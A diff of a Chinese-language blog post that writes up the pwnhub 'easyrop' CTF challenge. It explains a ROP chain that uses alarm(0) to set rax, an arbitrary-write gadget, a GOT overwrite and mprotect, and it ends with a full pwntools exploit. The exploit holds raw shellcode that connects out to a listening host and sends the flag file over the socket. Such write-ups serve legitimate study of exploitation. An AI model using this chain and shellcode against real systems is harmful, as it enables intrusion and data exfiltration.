@@ -22,32 +22,32 @@
 <meta property="og:site_name" content="welc0me">
 <meta property="og:description" content="来自pwnhub春季赛的一道题目，比赛的时候看了，完全没有思路。赛后复现发现题目确实很复杂。但是也学到了非常多。包括：能够任意地址写的magic，反向shell，alarm设置rax，构造syscall指令的方法。">
 <meta property="og:locale">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427143615956.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427143836630.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427143929904.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427144457532.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427145207754.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427145329461.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427150610764.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427153218710.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427164128901.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427165707253.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427212817318.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427160338128.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427161512739.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427161443802.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427171103873.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427185420778.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427213159616.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427212202690.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427212635790.png">
-<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220427145207754.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427143615956.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427143836630.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427143929904.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427144457532.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427145207754.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427145329461.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427150610764.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427153218710.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427164128901.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427165707253.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427212817318.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427160338128.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427161512739.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427161443802.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427171103873.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427185420778.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427213159616.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427212202690.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427212635790.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427145207754.png">
 <meta property="article:published_time" content="2022-04-27T06:35:35.000Z">
 <meta property="article:modified_time" content="2022-04-27T13:55:22.000Z">
 <meta property="article:author" content="nich0las">
 <meta property="article:tag" content="stack">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://nicholas-wei.github.io/.io//image-20220427143615956.png">
+<meta name="twitter:image" content="https://nicholas-wei.github.io/2022/04/27/pwnhub2022/image-20220427143615956.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -326,59 +326,59 @@
 <span id="more"></span>
 
 <h1 id="easyrop"><a href="#easyrop" class="headerlink" title="easyrop"></a>easyrop</h1><p>逻辑很简单，只不过关了输入输出流。</p>
-<p><img src="/.io//image-20220427143615956.png" alt="image-20220427143615956"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427143615956.png" alt="image-20220427143615956"></p>
 <p>当时一开始看到的想法是，这个直接重新打开输出流不就完事了?但是可能没有这种选项。</p>
-<p><img src="/.io//image-20220427143836630.png" alt="image-20220427143836630"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427143836630.png" alt="image-20220427143836630"></p>
 <p>(这里竟然能被检查出来canary也真是醉了…</p>
 <p>同时，题目开了沙箱。也就是允许正规的ORW。但是无法输出</p>
-<p><img src="/.io//image-20220427143929904.png" alt="image-20220427143929904"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427143929904.png" alt="image-20220427143929904"></p>
 <h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>基本想法肯定是ORW。如果不能本地读取，看了wp之后发现还有一种方法，就是自己开一个socket然后在公网服务器上读。这牵涉到很多rop的gardet。因此需要考虑是否有可能把某部分映射成为可执行，也就是调用mprotect。但是怎么控制rax呢？</p>
 <p>这道题给了一个新的思路。以前是通过read返回值可以设置rax，这里<strong>通过将alarm重新设置为0也就是alarm(0)时，会返回没有结束的秒数到寄存器rax中。利用这个特性我们可以获得一个0xf以下的rax。</strong></p>
 <p>因此，可以等待5秒，然后调用alarm(0)，得到eax为10，然后利用ret2csu执行mprotect(bss, 0x1000, 7)。</p>
-<p><img src="/.io//image-20220427144457532.png" alt="image-20220427144457532"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427144457532.png" alt="image-20220427144457532"></p>
 <p>可以看到这里正好有mprotect这个系统调用，也符合我们写汇编代码的需求。于是我们可以把堆映射为可执行的，从而调一个socket，在公网上完成读flag。</p>
 <p>但是，进一步发现，我们并没有<code>syscall;ret</code>的gardet。这似乎就没法调用mprotect了。</p>
 <p>答案中给出了一个神奇的办法。注意到下面这个gardet。</p>
 <p><code>add dword ptr [rbp - 0x3d], ebx; nop xxxxx; ret</code>是一般的binary都有的。他的opcode是<code>015dc3</code>。</p>
-<p><img src="/.io//image-20220427145207754.png" alt="image-20220427145207754"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427145207754.png" alt="image-20220427145207754"></p>
 <p>通过以上的gardet，结合ret2csu的gardet。我们就可以<strong>实现一个任意地址写的rop链</strong>。这是一个神奇的操作。而且在一般的binary里面基本都有！</p>
-<p><img src="/.io//image-20220427145329461.png" alt="image-20220427145329461"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427145329461.png" alt="image-20220427145329461"></p>
 <p>通过这个rop链，我们可以把alarm的got表改成<code>syscall</code>。具体来说如下图所示。我们把alarm的got表的内容(下图中0x00007ffff7e9fd90)改成0x00007ffff7e9fd99即可。</p>
-<p><img src="/.io//image-20220427150610764.png" alt="image-20220427150610764"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427150610764.png" alt="image-20220427150610764"></p>
 <p>只要把这个修改了，我们就能创造出一个<code>syscall ret</code>的gadget。</p>
 <p>然而，也不是这么容易调用mprotect。因为我们没有pop rdx的gardet。不过我们可以用ret2csu来解决。注意到下面的mov rdx,r15可以用来解决这个问题。</p>
-<p><img src="/.io//image-20220427153218710.png" alt="image-20220427153218710"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427153218710.png" alt="image-20220427153218710"></p>
 <p>最后。(这个算是一个补充知识)，使用rep的时候(因为我们需要把输入转移到堆上)各个寄存器放什么。如下图，是把esi移动到edi中。</p>
-<p><img src="/.io//image-20220427164128901.png" alt="image-20220427164128901"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427164128901.png" alt="image-20220427164128901"></p>
 <p>因此，整理一下思路。</p>
 <h3 id="思路的总结"><a href="#思路的总结" class="headerlink" title="思路的总结"></a>思路的总结</h3><ol>
 <li>等待五秒，调用<code>alarm(0)</code>，这里可以直接使用csu来调用。</li>
 <li>上一步结束之后，应该能使得eax变为10(mprotect)，先修改alarm的got表里面改成syscall，之后利用这个syscall结合ret2csu完成一个mprotect修改特定位置的权限。这里选择修改堆为可执行。</li>
 <li>在堆上写好一些rep要用到的指令。包括<code>pop rbp rbx rcx</code>(用于magic方法)、<code>mov rsi rsp ret</code>（用于rep）、<code>rep movs</code>，就是rep，后面在栈上就可以直接使用。注意这里要直接写入16进制的指令数值。用下面的方法</li>
 </ol>
-<p><img src="/.io//image-20220427165707253.png" alt="image-20220427165707253"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427165707253.png" alt="image-20220427165707253"></p>
 <ol start="4">
 <li>在栈上写好shellcode，主要是socket+connect+sendfile，使用rep把shellcode拷贝到bss段执行(需要提前在堆上构造一些rep使用所需要的指令)。因为如果不用rep，就要使用上面提到的gardet，可能导致长度不够的问题。</li>
 <li>跳转到堆上执行shellcode</li>
 </ol>
 <p>调试过程十分复杂，光复现就花了五个小时…</p>
 <h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><h3 id="修改alarm"><a href="#修改alarm" class="headerlink" title="修改alarm"></a>修改alarm</h3><p>修改alarm为syscall。能够实现的原因是用那个magic能够控制任意地址加上一个任意数值。然后alarm在libc里面的内容里面有syscall。因此我们直接把地址加上这么多即可。</p>
-<p><img src="/.io//image-20220427212817318.png" alt="image-20220427212817318"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427212817318.png" alt="image-20220427212817318"></p>
 <p>下面是改掉之后的结果。</p>
-<p><img src="/.io//image-20220427160338128.png" alt="image-20220427160338128"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427160338128.png" alt="image-20220427160338128"></p>
 <h3 id="调用mprotect"><a href="#调用mprotect" class="headerlink" title="调用mprotect"></a>调用mprotect</h3><p>可以看到这里的参数，以及最后的alarm+9的内容。</p>
-<p><img src="/.io//image-20220427161512739.png" alt="image-20220427161512739"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427161512739.png" alt="image-20220427161512739"></p>
 <p>我们把堆映射为RWX的。</p>
-<p><img src="/.io//image-20220427161443802.png" alt="image-20220427161443802"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427161443802.png" alt="image-20220427161443802"></p>
 <h3 id="寻找相关汇编"><a href="#寻找相关汇编" class="headerlink" title="寻找相关汇编"></a>寻找相关汇编</h3><p>下面这个rep的好难找，真的要自己输入这样的指令。算是借此学到了吧，因为网上真的查不到这样的指令。下面指令的意思是把rsi指针中的数据中内容复制到rdi指针中。(类似于字符串拷贝的汇编)一次拷贝8byte。<strong>拷贝总次数由rcx决定</strong>。是和rep配合起来使用的。</p>
-<p><img src="/.io//image-20220427171103873.png" alt="image-20220427171103873"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427171103873.png" alt="image-20220427171103873"></p>
 <h3 id="相关系统调用"><a href="#相关系统调用" class="headerlink" title="相关系统调用"></a>相关系统调用</h3><p>一共用到三个系统调用。第一个是本地创建一个socket，用来后续bind。</p>
 <p>第二个是connect，相当于这个socket连接到addr指针中的ip地址和端口(到这里大概明白了为什么要公网IP，因为打远程的时候远程的binary没发链接到自己的虚拟机上，自己的虚拟机本地调试的时候，这里可以在本地监听)</p>
 <p>第三个是sendfile。其中out_fd表示输出到什么文件,in_fd表示从什么文件读。这里我先开的socket，再打开的文件，所以是下面的顺序。offset就不用管了，直接写0，最后是长度。</p>
-<p><img src="/.io//image-20220427185420778.png" alt="image-20220427185420778"></p>
-<p><img src="/.io//image-20220427213159616.png" alt="image-20220427213159616"></p>
-<p><img src="/.io//image-20220427212202690.png" alt="image-20220427212202690"></p>
-<h3 id="最终反向shell拿到flag"><a href="#最终反向shell拿到flag" class="headerlink" title="最终反向shell拿到flag"></a>最终反向shell拿到flag</h3><p><img src="/.io//image-20220427212635790.png" alt="image-20220427212635790"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427185420778.png" alt="image-20220427185420778"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427213159616.png" alt="image-20220427213159616"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427212202690.png" alt="image-20220427212202690"></p>
+<h3 id="最终反向shell拿到flag"><a href="#最终反向shell拿到flag" class="headerlink" title="最终反向shell拿到flag"></a>最终反向shell拿到flag</h3><p><img src="/2022/04/27/pwnhub2022/image-20220427212635790.png" alt="image-20220427212635790"></p>
 <h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>首先上一个完整的exp。当本地打开127.0.0.1:10001端口监听之后，可以获得一个flag。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">filename=<span class="string">&quot;./easyrop&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">remote_port = <span class="number">10001</span></span><br><span class="line">remote_ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reverse_shell = <span class="string">b&quot;\x6a\x29\x58\x6a\x06\x5a\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00&quot;</span>+ \</span><br><span class="line">    remote_port.to_bytes(<span class="number">2</span>, <span class="string">&quot;big&quot;</span>)+socket.inet_aton(remote_ip) + <span class="string">b&quot;\x51\x54\x5e\xb2\x10\x0f\x05&quot;</span></span><br><span class="line">send_flag = <span class="string">b&#x27;\xe8\x05\x00\x00\x00flag\x00_H\x89\xd0H1\xd21\xf6\xb0\x02\x0f\x05H\xc7\xc0(\x00\x00\x00H1\xffH\xc7\xc6\x01\x00\x00\x00H1\xd2I\xc7\xc20\x00\x00\x00\x0f\x05&#x27;</span></span><br><span class="line"><span class="comment"># send_flag = b&quot;\x92\x48\xbb\x2f\x66\x6c\x61\x67\x00\x00\x00\x53\x54\x5f\x31\xf6\xb0\x02\x0f\x05\x96\x87\xfa\x68\x00\x13\x60\x00\x5a\x6a\x30\x41\x5a\x31\xc0\xb0\x28\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x0000000000400618</span> <span class="comment"># add dword ptr [rbp - 0x3d], ebx; nop xxxxx; ret, arbitary write</span></span><br><span class="line">csu = <span class="number">0x4008FA</span> <span class="comment"># pop rbx, pop rbp, pop 4, ret</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400903</span> <span class="comment"># pop rdi</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400901</span> <span class="comment"># pop rsi,r15,ret</span></span><br><span class="line">pop_rbp_rbx_rcx_ret = <span class="number">0x601500</span></span><br><span class="line">mov_rsi_rsp_ret = <span class="number">0x601600</span></span><br><span class="line">rep_movs = <span class="number">0x601650</span></span><br><span class="line">shellcode_addr = <span class="number">0x601700</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># wait for 5 seconds</span></span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call alarm(0) to get a 10 in eax</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;alarm&#x27;</span>]) <span class="comment"># call alarm</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># use magic to change alarm&#x27;s got</span></span><br><span class="line">payload +=p64(csu)</span><br><span class="line">payload +=p64(<span class="number">0x09090909</span>)<span class="comment"># notice: here is add</span></span><br><span class="line">payload +=p64(elf.got[<span class="string">&#x27;alarm&#x27;</span>]+<span class="number">0x3d</span>-<span class="number">3</span>) <span class="comment"># we only need to change 1 byte, so -3 here</span></span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">4</span> <span class="comment"># fill rest r*</span></span><br><span class="line">payload +=p64(magic)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call mprotect, with eax = 10 and syscall gardet</span></span><br><span class="line"><span class="comment"># using ret2csu, with call alarm&#x27;s got == syscall</span></span><br><span class="line">payload +=p64(csu)</span><br><span class="line">payload +=p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">payload +=p64(<span class="number">1</span>) <span class="comment"># rbp</span></span><br><span class="line">payload +=p64(elf.got[<span class="string">&#x27;alarm&#x27;</span>]) <span class="comment"># r12, r12+rbx*8</span></span><br><span class="line">payload +=p64(<span class="number">0x601000</span>) <span class="comment"># r13---&gt; rdi, addr, is bss</span></span><br><span class="line">payload +=p64(<span class="number">0x1000</span>) <span class="comment">#r14---&gt;rsi, length</span></span><br><span class="line">payload +=p64(<span class="number">7</span>) <span class="comment"># r15 --- &gt; rdx, mode</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># the call part of ret2csu</span></span><br><span class="line">payload +=p64(<span class="number">0x4008E0</span>)</span><br><span class="line"><span class="comment"># now we have successfully mprotexted an addr, form gardet1</span></span><br><span class="line">payload +=p64(<span class="number">0</span>) <span class="comment"># junk</span></span><br><span class="line">payload +=p64(<span class="number">0xc3595b5d</span>) <span class="comment">#pop_rbp_rbx_rcx_ret&#x27;s machine code, rbx content</span></span><br><span class="line">payload +=p64(pop_rbp_rbx_rcx_ret+<span class="number">0x3d</span>) <span class="comment"># rbp place</span></span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload +=p64(magic) <span class="comment"># write to heap</span></span><br><span class="line"><span class="comment"># form gardet2</span></span><br><span class="line">payload +=p64(pop_rbp_rbx_rcx_ret)</span><br><span class="line">payload +=p64(mov_rsi_rsp_ret+<span class="number">0x3d</span>) <span class="comment">#place</span></span><br><span class="line">payload +=p64(<span class="number">0xc3e68948</span>) <span class="comment"># mov_rsi_rsp_ret</span></span><br><span class="line">payload +=p64(<span class="number">0</span>) <span class="comment"># junk</span></span><br><span class="line">payload +=p64(magic)</span><br><span class="line"><span class="comment"># form gardet3</span></span><br><span class="line">payload +=p64(pop_rbp_rbx_rcx_ret)</span><br><span class="line">payload +=p64(rep_movs+<span class="number">0x3d</span>)</span><br><span class="line">payload +=p64(<span class="number">0xc3a548f3</span>) <span class="comment"># rep movs QWORD PTR es:[rdi], QWORD PTR ds:[rsi]; ret</span></span><br><span class="line">payload +=p64(<span class="number">15</span>) <span class="comment"># rcx=copy times:15</span></span><br><span class="line">payload +=p64(magic)</span><br><span class="line"></span><br><span class="line"><span class="comment"># copy start</span></span><br><span class="line">payload +=p64(pop_rdi)</span><br><span class="line">payload +=p64(shellcode_addr-<span class="number">0x10</span>) <span class="comment"># target addr</span></span><br><span class="line">payload +=p64(mov_rsi_rsp_ret) <span class="comment"># notice : must give rsp(the pointer) to rsi</span></span><br><span class="line">payload +=p64(rep_movs) <span class="comment"># start copy</span></span><br><span class="line">payload +=p64(shellcode_addr) <span class="comment"># execute addr!</span></span><br><span class="line">payload +=reverse_shell</span><br><span class="line">payload +=send_flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&quot;b *0x4008fa&quot;</span>) <span class="comment"># at ret in csu to avoid alarm&#x27;s time</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -395,7 +395,7 @@
 <li>magic指令(我就这样命名了hhh)<strong>可以结合csu的gadget实现任意地址写任意数值</strong>。这是很强大的。</li>
 </ol>
 <p><code>add dword ptr [rbp - 0x3d], ebx; nop xxxxx; ret</code></p>
-<p><img src="/.io//image-20220427145207754.png" alt="image-20220427145207754"></p>
+<p><img src="/2022/04/27/pwnhub2022/image-20220427145207754.png" alt="image-20220427145207754"></p>
 <ol start="2">
 <li>使用alarm剩余的秒数设置rax。这也是新学到的方法。</li>
 <li>反向shell。这也是第一次碰到。并且知道了shellcode如何构造。</li>
